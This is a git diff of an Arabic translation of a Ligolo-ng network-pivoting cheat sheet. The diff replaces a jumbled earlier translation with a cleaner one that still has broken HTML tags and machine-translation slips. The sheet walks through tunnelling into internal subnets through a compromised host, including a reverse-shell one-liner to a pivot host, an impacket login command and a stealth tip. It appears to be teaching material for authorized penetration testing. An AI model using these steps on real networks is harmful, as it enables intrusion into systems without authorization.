@@ -1,12 +1,16 @@
-# 🔀 Ligolo-ng — ورقة مرجعية شاملة
-
 <!-- language-home-navigation -->
 [🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
+
+[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
+
+---
 
 
+# 🔀 Ligolo-ng - ورقة الغش الكاملة
 
+[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
 ```
   ██╗     ██╗ ██████╗  ██████╗ ██╗      ██████╗      ███╗   ██╗ ██████╗ 
   ██║     ██║██╔════╝ ██╔═══██╗██║     ██╔═══██╗     ████╗  ██║██╔════╝ 
@@ -16,65 +20,63 @@
   ╚══════╝╚═╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝      ╚═╝  ╚═══╝ ╚═════╝ 
                  Advanced TUN-based Pivoting Tool
 ```
-
 <p align="center">
   <img src="https://img.shields.io/badge/Ligolo--ng-Pivoting-blue?style=for-the-badge" alt="Ligolo-ng">
   <img src="https://img.shields.io/badge/TUN_Interface-VPN_Style-green?style=for-the-badge" alt="TUN Interface">
   <img src="https://img.shields.io/badge/Go-Cross_Platform-orange?style=for-the-badge" alt="Go">
-  <img src="https://img.shields.io/badge/Network_Pivoting-red?style=for-the-badge" alt="Network Pivoting">
-</p>
+  <img src="https://img.shields.io/badge/Network_Pivoting-red?style=for-the-badge" alt="تمحور الشبكة">
+</ص>
 
 <p align="center">
-  <b>🌐 Modern, simple, and high-performance pivoting tool using TUN interfaces instead of SOCKS proxies</b>
-</p>
+  <b>🌐 أداة محورية حديثة وبسيطة وعالية الأداء تستخدم واجهات TUN بدلاً من بروكسيات SOCKS</b>
+</ص>
 
 ---
 
 ## 📋 جدول المحتويات
 
-- [مقدمة](#-introduction)
-- [Why Ligolo-ng? (Ligolo-ng vs SOCKS/Proxychains)](#-why-ligolo-ng)
-- [Architecture & How It Works](#-architecture--how-it-works)
-- [التثبيت](#-installation)
-- [Quick Start Guide](#-quick-start-guide)
-  - [التثبيت](#step-1-setup-tun-interface-on-attacker)
-  - [التثبيت](#step-2-start-the-ligolo-ng-proxy)
-  - [Run the proxy using self-signed TLS certificates:](#step-3-deploy-the-agent-on-pivot-target)
-  - [On Linux Target:](#step-4-configure-routing-on-attacker)
-  - [Once the agent connects, inspect its network interfaces from the proxy console to determine the target's internal subnets (e.g., `172.16.1.0/24`).](#step-5-start-the-tunnel-session)
-- [Reverse Port Forwarding (Listeners)](#-reverse-port-forwarding-listeners)
-- [Double Pivoting (Multi-Tier Pivoting)](#-double-pivoting-multi-tier-pivoting)
-- [المصادر والمراجع](#-proxy-interactive-commands-reference)
-- [الخيارات والمعلمات](#-agent-command-line-options)
-- [Troubleshooting & Best Practices](#-troubleshooting--best-practices)
-- [Legal Disclaimer](#-legal-disclaimer)
-- [المصادر والمراجع](#-resources)
+- [المقدمة](#-المقدمة)
+- [لماذا Ligolo-ng؟ (Ligolo-ng vs SOCKS/Proxychains)](#-why-ligolo-ng)
+- [الهندسة المعمارية وكيف تعمل](#-الهندسة المعمارية--كيف-تعمل)
+- [التثبيت](#-التثبيت)
+- [دليل البدء السريع](#-دليل البدء السريع)
+  - [الخطوة 1: إعداد واجهة TUN على المهاجم](#step-1-setup-tun-interface-on-attacker)
+  - [الخطوة 2: بدء تشغيل وكيل Ligolo-ng](#step-2-start-the-ligolo-ng-proxy)
+  - [الخطوة 3: نشر الوكيل على الهدف المحوري](#step-3-deploy-the-agent-on-pivot-target)
+  - [الخطوة 4: تكوين التوجيه على المهاجم](#step-4-configure-routing-on-attacker)
+  - [الخطوة 5: بدء جلسة النفق](#step-5-start-the-tunnel-session)
+- [إعادة توجيه المنفذ العكسي (المستمعون)](#-reverse-port-forwarding-listeners)
+- [المحور المزدوج (المحور متعدد الطبقات)](#-المحور المزدوج-المحور متعدد الطبقات)
+- [مرجع أوامر الوكيل التفاعلية](#-proxy-interactive-commands-reference)
+- [خيارات سطر أوامر الوكيل](#-خيارات-سطر أوامر الوكيل)
+- [استكشاف الأخطاء وإصلاحها وأفضل الممارسات](#-استكشاف الأخطاء وإصلاحها--أفضل الممارسات)
+- [إخلاء المسؤولية القانونية](#-إخلاء المسؤولية القانونية)
+- [الموارد](#-الموارد)
 
 ---
 
-## 🎯 مقدمة
+## 🎯 المقدمة
 
-**Ligolo-ng** is an advanced, lightweight, and fast tunneling and pivoting tool written in Go. Unlike traditional SOCKS proxies (such as standard Chisel or SSH dynamic forwarding), Ligolo-ng establishes a virtual **TUN interface** directly on your attacker machine.
+**Ligolo-ng** عبارة عن أداة متقدمة وخفيفة الوزن وسريعة للنفق والدوران مكتوبة بلغة Go. على عكس بروكسيات SOCKS التقليدية (مثل التوجيه الديناميكي Chisel أو SSH القياسي)، ينشئ Ligolo-ng واجهة TUN افتراضية مباشرة على جهاز المهاجم الخاص بك.
 
-This turns your compromised pivot host into a true VPN-like gateway: all tools on your attacker machine (including `nmap -sS`, `crackmapexec`, `evil-winrm`, `impacket`, and browsers) can access internal subnets directly by IP address without prefixing commands with `proxychains`.
-
----
-
-## ⚖️ Why Ligolo-ng?
-
-|Feature|Ligolo-ng|Proxychains + SOCKS|SSH SOCKS (`-D`)|
-|---------|-----------|---------------------|------------------|
-|**Protocol Support**|Full TCP & UDP|TCP only (poor UDP)|TCP only|
-|**Nmap SYN Scan (`-sS`)**|✅ Yes (Native)|❌ No (Requires TCP `-sT`)|❌ No|
-|**Tool Compatibility**|100% (Kernel IP stack)|Inconsistent (LD_PRELOAD)|Inconsistent|
-|**Speed & Latency**|⭐⭐⭐⭐⭐ Very Fast|⭐⭐⭐ Moderate|⭐⭐⭐ Moderate|
-|**No SOCKS Wrapper**|✅ Yes|❌ Requires wrapper|❌ Requires wrapper|
-|**Reverse Listeners**|✅ Built-in|❌ Requires separate tool|❌ Limited|
+يؤدي هذا إلى تحويل مضيفك المحوري المخترق إلى بوابة حقيقية تشبه VPN: يمكن لجميع الأدوات الموجودة على جهازك المهاجم (بما في ذلك `nmap -sS` و`crackmapexec` و`evil-winrm` و`impacket` والمتصفحات) الوصول إلى الشبكات الفرعية الداخلية مباشرة عن طريق عنوان IP دون بادئة الأوامر بـ `proxychains`.
 
 ---
 
-## 🏗️ Architecture & How It Works
+## ⚖️ لماذا Ligolo-ng؟
 
+| ميزة | ليجولو-نغ | سلاسل الوكلاء + الجوارب | جوارب SSH (`-D`) |
+|---------|----------|--------------------|------------------|
+| **دعم البروتوكول** | كامل TCP وUDP | TCP فقط (UDP ضعيف) | TCP فقط |
+| **Nmap SYN Scan (`-sS`)**| ✅ نعم (أصلي) | ❌ لا (يتطلب TCP `-sT`) | ❌ لا |
+| **توافق الأداة** | 100% (مكدس Kernel IP) | غير متناسق (LD_PRELOAD) | غير متناسق |
+| **السرعة وزمن الوصول** | ⭐⭐⭐⭐⭐ سريع جدا | ⭐⭐⭐ معتدل | ⭐⭐⭐ معتدل |
+| **لا يوجد غلاف جوارب** | ✅ نعم | ❌ يتطلب المجمع | ❌ يتطلب المجمع |
+| ** المستمعون العكسيون ** | ✅ مدمج | ❌ يتطلب أداة منفصلة | ❌ محدودة |
+
+---
+
+## 🏗️ الهندسة المعمارية وكيف تعمل
 ```
 +-------------------+                          +---------------------+                          +----------------------+
 |  Attacker Machine |                          | Pivot Target (Host) |                          | Internal Subnet Host |
@@ -87,17 +89,15 @@ This turns your compromised pivot host into a true VPN-like gateway: all tools o
 | (172.16.1.0/24)   |                          |     (172.16.1.10)   |                          | (Port 445, 80, etc.) |
 +-------------------+                          +---------------------+                          +----------------------+
 ```
-
-1. **Proxy:** Runs on your attacker machine, manages sessions, and bridges packets between your virtual TUN interface and connected agents.
-2. **Agent:** A lightweight binary executed on the compromised internal machine (Linux, Windows, macOS, or ARM).
-3. **TUN Interface:** A software loopback network interface created on Linux that routes traffic destined for internal subnets straight into Ligolo.
+1. **الوكيل:** يعمل على جهاز المهاجم الخاص بك، ويدير الجلسات، ويربط الحزم بين واجهة TUN الافتراضية الخاصة بك والوكلاء المتصلين.
+2. **Agent:** برنامج ثنائي خفيف الوزن يتم تنفيذه على الجهاز الداخلي المخترق (Linux أو Windows أو macOS أو ARM).
+3. ** واجهة TUN: ** واجهة شبكة استرجاع البرامج التي تم إنشاؤها على Linux والتي توجه حركة المرور الموجهة للشبكات الفرعية الداخلية مباشرة إلى Ligolo.
 
 ---
 
 ## 📥 التثبيت
 
-3. **TUN Interface:** A software loopback network interface created on Linux that routes traffic destined for internal subnets straight into Ligolo.
-
+قم بتنزيل أحدث الإصدارات الثنائية لكل من **proxy** و **agent** من صفحة إصدارات GitHub الرسمية:
 ```bash
 # Download latest proxy for Linux
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz
@@ -112,15 +112,13 @@ tar -zxvf ligolo-ng_agent_0.7.2-alpha_linux_amd64.tar.gz -C /opt/ligolo-agents/l
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip
 unzip ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip -d /opt/ligolo-agents/windows/
 ```
-
 ---
 
-## 🚀 بناء الجملة الأساسي
+## 🚀 دليل البدء السريع
 
-### التثبيت
+### الخطوة 1: إعداد واجهة TUN على المهاجم
 
-Before running the proxy, create a persistent TUN device on your Linux attacker machine:
-
+قبل تشغيل الوكيل، قم بإنشاء جهاز TUN ثابت على جهاز مهاجم Linux الخاص بك:
 ```bash
 # Create a TUN interface named "ligolo"
 sudo ip tuntap add user $USER mode tun ligolo
@@ -131,39 +129,33 @@ sudo ip link set ligolo up
 # Verify interface state
 ip link show ligolo
 ```
+### الخطوة 2: ابدأ تشغيل وكيل Ligolo-ng
 
-### التثبيت
-
-Before running the proxy, create a persistent TUN device on your Linux attacker machine:
-
+قم بتشغيل الوكيل باستخدام شهادات TLS الموقعة ذاتيًا:
 ```bash
 cd /opt/ligolo-proxy/
 ./proxy -self-cert -laddr 0.0.0.0:11601
 ```
+> **نصيحة:** يمكنك أيضًا تقديم شهادات Let's Encrypt صالحة باستخدام `-certfile` و`-keyfile` للتخفي في مشاركات الفريق الأحمر.
 
-Step 2: Start the Ligolo-ng Proxy
+### الخطوة 3: نشر الوكيل على الهدف المحوري
 
-### Run the proxy using self-signed TLS certificates:
+انقل الوكيل إلى مضيفك المخترق وقم بتنفيذه:
 
-Transfer the agent to your compromised host and execute it:
-
-#### > **Tip:** You can also provide valid Let's Encrypt certificates using `-certfile` and `-keyfile` for stealth in Red Team engagements.
+#### على هدف Linux:
 ```bash
 chmod +x agent
 ./agent -connect 192.168.1.100:11601 -ignore-cert
 ```
-
-#### On Windows Target:
+#### على هدف Windows:
 ```powershell
 .\agent.exe -connect 192.168.1.100:11601 -ignore-cert
 ```
+### الخطوة 4: تكوين التوجيه على المهاجم
 
-### On Linux Target:
+بمجرد اتصال الوكيل، قم بفحص واجهات الشبكة الخاصة به من وحدة تحكم الوكيل لتحديد الشبكات الفرعية الداخلية للهدف (على سبيل المثال، `172.16.1.0/24`).
 
-Once the agent connects, inspect its network interfaces from the proxy console to determine the target's internal subnets (e.g., `172.16.1.0/24`).
-
-On your **attacker terminal** (separate window), add a route pointing to the TUN interface:
-
+في **محطة المهاجم** (نافذة منفصلة)، أضف طريقًا يشير إلى واجهة TUN:
 ```bash
 # Route internal subnet through ligolo TUN device
 sudo ip route add 172.16.1.0/24 dev ligolo
@@ -171,20 +163,16 @@ sudo ip route add 172.16.1.0/24 dev ligolo
 # Check route table
 ip route show | grep ligolo
 ```
+### الخطوة 5: ابدأ جلسة النفق
 
-### Once the agent connects, inspect its network interfaces from the proxy console to determine the target's internal subnets (e.g., `172.16.1.0/24`).
-
-On your **attacker terminal** (separate window), add a route pointing to the TUN interface:
-
+في موجه الوكيل Ligolo-ng التفاعلي:
 ```text
 ligolo-ng » session
 ? Select a session: 1 - user@PIVOT-HOST - 192.168.1.50:52418
 [Agent : user@PIVOT-HOST] » start
 [Agent : user@PIVOT-HOST] » INFO[0025] Tunnel started
 ```
-
-Step 5: Start the Tunnel Session
-
+الآن لديك وصول مباشر ومباشر عبر IP إلى الشبكة الداخلية! اختبره:
 ```bash
 # Ping internal host
 ping -c 3 172.16.1.50
@@ -195,114 +183,107 @@ nmap -sS -Pn -T4 -p 80,445,3389 172.16.1.50
 # Run Impacket directly
 impacket-wmiexec DOMAIN/admin:Password@172.16.1.50
 ```
-
 ---
 
-## 🔄 Reverse Port Forwarding (Listeners)
+## 🔄 إعادة توجيه المنفذ العكسي (المستمعون)
 
-Want to receive a reverse shell or catch an NTLM authentication relay on your attacker box from an internal host that cannot route back to your attacker IP? Use **listeners**!
+هل ترغب في تلقي صدفة عكسية أو التقاط ترحيل مصادقة NTLM على صندوق المهاجم الخاص بك من مضيف داخلي لا يمكنه العودة إلى عنوان IP الخاص بالمهاجم؟ استخدم **المستمعين**!
 
-When you configure a listener in Ligolo-ng, the agent opens a listening port on the **pivot machine** and relays incoming traffic back to your attacker machine.
+عند تكوين مستمع في Ligolo-ng، يفتح الوكيل منفذ استماع على **الجهاز المحوري** ويعيد حركة المرور الواردة مرة أخرى إلى جهاز المهاجم.
 
-### أمثلة عملية
+### مثال: الإمساك بصدفة عكسية
 
-Inside the proxy session:
-
+داخل جلسة الوكيل:
 ```text
 [Agent : user@PIVOT-HOST] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
 INFO[0035] Listener created on 0.0.0.0:4444
 ```
-
-أمثلة عملية
-
+على **جهاز المهاجم**:
 ```bash
 nc -lvnp 4444
 ```
-
-On an **internal target** (`172.16.1.75`):
-
+على **هدف داخلي** (`172.16.1.75`):
 ```bash
 # Send reverse shell to the pivot host's internal IP
 bash -i >& /dev/tcp/172.16.1.10/4444 0>&1
 ```
-
-The pivot host forwards the connection straight to your Netcat listener!
+يقوم المضيف المحوري بإعادة توجيه الاتصال مباشرة إلى مستمع Netcat الخاص بك!
 
 ---
 
-## ⛓️ Double Pivoting (Multi-Tier Pivoting)
+## ⛓️ التمحور المزدوج (التمحور متعدد الطبقات)
 
-The pivot host forwards the connection straight to your Netcat listener!
+عند الوصول إلى الشبكات المتداخلة بشدة (الشبكة الفرعية أ -> الشبكة الفرعية ب -> الشبكة الفرعية ج):
 
-1. Establish your initial tunnel to Pivot 1 (`172.16.1.10`).
-2. Discover Pivot 2 located in Subnet B (`10.0.0.25`).
-⛓️ Double Pivoting (Multi-Tier Pivoting)
+1. أنشئ نفقك الأولي إلى المحور 1 (`172.16.1.10`).
+2. اكتشف Pivot 2 الموجود في الشبكة الفرعية B (`10.0.0.25`).
+3. قم بإعداد المستمع على Pivot 1 لإعادة توجيه حركة المرور من الشبكة الفرعية B إلى منفذ الوكيل `11601`:
    ```text
    [Agent : Pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
    ```
-When accessing deeply nested networks (Subnet A -> Subnet B -> Subnet C):
+4. انشر وكيل Ligolo على Pivot 2 واتصل بعنوان IP الخاص بـ Pivot 1:
    ```bash
    ./agent -connect 172.16.1.10:11601 -ignore-cert
    ```
-1. Establish your initial tunnel to Pivot 1 (`172.16.1.10`).
+5. ستظهر جلسة ثانية في الوكيل الخاص بك! إضافة مسار للشبكة الفرعية C:
    ```bash
    sudo ip route add 10.0.0.0/24 dev ligolo
    ```
-3. Set up a listener on Pivot 1 to forward traffic from Subnet B back to your proxy port `11601`:
+6. قم بالتبديل إلى الجلسة 2 واكتب `start`.
 
 ---
 
-## ⌨️ المصادر والمراجع
+## ⌨️ مرجع أوامر الوكيل التفاعلية
 
-|الأمر|الوصف|مثال|
-|---------|-------------|---------|
-|`session`|List and select active connected agent sessions|`session`|
-|`start`|Start tunneling packets through the active agent|`start`|
-|`stop`|Stop the active tunnel session|`stop`|
-|`ifconfig`|Show network interfaces of the selected agent|`ifconfig`|
-|`listener_add`|Create a listening port on the pivot agent|`listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8443`|
-|`listener_list`|List all active listeners on current agent|`listener_list`|
-|`listener_close`|Close a specific active listener|`listener_close --id 0`|
-|`help`|Display command help|`help`|
-|`exit`|Terminate proxy or return to main menu|`exit`|
-
----
-
-## ⚙️ الخيارات والمعلمات
-
-|العلامة|الوصف|مثال|
-|------|-------------|---------|
-|`-connect`|Address and port of the Ligolo proxy|`-connect 192.168.1.100:11601`|
-|`-ignore-cert`|Skip TLS certificate verification|`-ignore-cert`|
-|`-retry`|Automatically retry connection if disconnected|`-retry`|
-|`-auto-clear`|Clear terminal output upon execution|`-auto-clear`|
+| الأمر | الوصف | مثال |
+|---------|------------|---------|
+| `session` | قم بإدراج وتحديد جلسات الوكيل المتصلة النشطة | `session` |
+| `start` | ابدأ في توجيه الحزم عبر العامل النشط | `start` |
+| `stop` | إيقاف جلسة النفق النشطة | `stop` |
+| `ifconfig` | إظهار واجهات الشبكة للوكيل المحدد | `ifconfig` |
+| `listener_add` | قم بإنشاء منفذ استماع على الوكيل المحوري | `listener_add --addr 0.0.0.0:8443 --to 127.0.0.1:8443` |
+| `listener_list`| قم بإدراج جميع المستمعين النشطين على الوكيل الحالي | `listener_list` |
+| `listener_close`| إغلاق مستمع نشط محدد | `listener_close --id 0` |
+| `help` | عرض تعليمات الأمر | `help` |
+| `exit` | إنهاء الوكيل أو العودة إلى القائمة الرئيسية | `exit` |
 
 ---
 
-## 💡 نصائح وأفضل الممارسات
+## ⚙️ خيارات سطر أوامر الوكيل
 
-1. **Delete TUN Interface After Engagement:**
-   When finished with your test, clean up your routing table and delete the virtual interface:
+| علم | الوصف | مثال |
+|------|------------|---------|
+| `-connect` | عنوان ومنفذ وكيل ليغولو | `-connect 192.168.1.100:11601` |
+| `-ignore-cert` | تخطي التحقق من شهادة TLS | `-ignore-cert` |
+| `-retry` | إعادة محاولة الاتصال تلقائيًا في حالة قطع الاتصال | `-retry` |
+| `-auto-clear` | مسح مخرجات المحطة عند التنفيذ | `-auto-clear` |
+
+---
+
+## 💡 استكشاف الأخطاء وإصلاحها وأفضل الممارسات
+
+1. **حذف واجهة TUN بعد المشاركة:**
+   عند الانتهاء من الاختبار، قم بتنظيف جدول التوجيه الخاص بك وحذف الواجهة الافتراضية:
    ```bash
    sudo ip link set ligolo down
    sudo ip tuntap del mode tun ligolo
    ```
-2. **Double-Check IP Subnet Overlaps:**
-   Ensure the internal subnet you are routing (e.g. `192.168.1.0/24`) does not collide with your local attacker network. If it overlaps, use a more specific `/32` host route (e.g., `sudo ip route add 192.168.1.50/32 dev ligolo`).
-3. **Firewall Considerations on Pivot:**
-1. **Delete TUN Interface After Engagement:
-4. **Use `-retry` in Real Environments:**
-   Always run agents with `-retry` to automatically re-establish connections after transient network drops.
+2. **التحقق مرة أخرى من تداخلات الشبكة الفرعية لعنوان IP:**
+   تأكد من أن الشبكة الفرعية الداخلية التي تقوم بتوجيهها (على سبيل المثال، `192.168.1.0/24`) لا تتعارض مع شبكة المهاجم المحلية الخاصة بك. إذا كان متداخلًا، فاستخدم مسار مضيف `/32` أكثر تحديدًا (على سبيل المثال، `sudo ip route add 192.168.1.50/32 dev ligolo`).
+3. **اعتبارات جدار الحماية على المحور:**
+   في أهداف Windows، تأكد من أن جدار حماية Windows Defender يسمح بالاتصالات الصادرة على المنفذ 11601 أو منفذ المستمع الذي اخترته.
+4. **استخدم `-retry` في البيئات الحقيقية:**
+   قم دائمًا بتشغيل الوكلاء باستخدام `-retry` لإعادة تأسيس الاتصالات تلقائيًا بعد انقطاع الشبكة العابرة.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️إخلاء المسؤولية القانونية
 
-> **IMPORTANT:** Ligolo-ng is a powerful network routing utility. It must only be utilized during authorized penetration tests, red team engagements, and ethical security evaluations with explicit written consent.
+> **هام:** Ligolo-ng هي أداة مساعدة قوية لتوجيه الشبكة. ويجب استخدامه فقط أثناء اختبارات الاختراق المصرح بها، وارتباطات الفريق الأحمر، وتقييمات الأمان الأخلاقية بموافقة كتابية صريحة.
 
 ---
 
-## 📚 المصادر والمراجع
+## 📚 المصادر
 
-- [Official Ligolo-ng GitHub Repository](https://github.com/nicocha30/ligolo-ng)
-- [Official Ligolo-ng Documentation](https://github.com/nicocha30/ligolo-ng/blob/master/DOCUMENTATION.md)
+- [مستودع Ligolo-ng GitHub الرسمي](https://github.com/nicocha30/ligolo-ng)
+- [وثائق Ligolo-ng الرسمية](https://github.com/nicocha30/ligolo-ng/blob/master/DOCUMENTATION.md)
